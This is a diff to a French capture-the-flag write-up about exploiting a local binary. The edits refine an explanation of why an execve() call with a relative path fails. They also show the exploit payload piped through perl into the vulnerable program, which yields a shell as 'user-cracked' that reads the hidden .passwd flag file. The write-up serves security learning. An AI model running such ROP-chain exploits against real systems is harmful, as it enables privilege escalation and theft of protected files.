@@ -400,7 +400,7 @@ On remarque la ligne:
   
 	execve("Be@", [0], [/* 0 vars */])      = -1 ENOENT (No such file or directory)
   
-On est content, on a la confirmation qu'`execve()` est appelé, et avec les bons arguments qui plus est!  Tout va bien sauf que... `"Be@"` n'est pas trouvé (`ENOENT`)!  En fait le programme regarde dans le `CWD` et ne trouve rien.  Donc `execve()` échoue et on passe à l'instruction suivante... qu'on n'a pas gérée, `$rip` contient donc une adresse arbitraire, le programme saute à cette adresse et plante lamentablement.  C'est logique, puisque nous avons fourni un chemin relatif, le système ne sait donc pas qu'il faut chercher dans `/tmp/p` et regarde juste dans le répertoire courant.  Il faut donc qu'on exécute notre programme depuis le répertoire contenant notre wrapper a `/bin/dash`:  
+On est content, on a la confirmation qu'`execve()` est appelé, et avec les bons arguments qui plus est!  Tout va bien sauf que... `"Be@"` n'est pas trouvé (`ENOENT`)!  En fait le programme regarde dans le `CWD` et ne trouve rien.  Donc `execve()` échoue et on passe à l'instruction suivante... qu'on n'a pas gérée, `$rip` contient donc une adresse arbitraire, le programme saute à cette adresse et plante lamentablement.  C'est logique, puisque nous avons fourni un chemin relatif et qu'on a mis `NULL` comme environnement, le système ne sait donc pas qu'il faut chercher dans `/tmp/p` et regarde juste dans le répertoire courant.  Il faut donc qu'on exécute notre programme depuis le répertoire contenant notre wrapper a `/bin/dash`:  
   
 	$ cd /tmp/p && (perl -e 'print "'$sc'"') | strace ~/prog
 	[...]
@@ -420,11 +420,13 @@ Ok, notre programme rend la main immédiatement.  Il a dû prendre un `EOF` ou u
   
 	$ (perl -e 'print "'$sc'" . "\n"'; cat) |  ~/prog
 	Hex result: 414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141160100000c010000424242424242
+        whoami
+        user-cracked
 	ls
 	Be@  ropchain.py  rp-lin-x64
 	cd /home/user
 	ls -a
-        .passwd prog prog.c
+	.passwd prog prog.c
 	cat .passwd
 	CeciEstMonFlagTagadaTsoinTsoin!
   
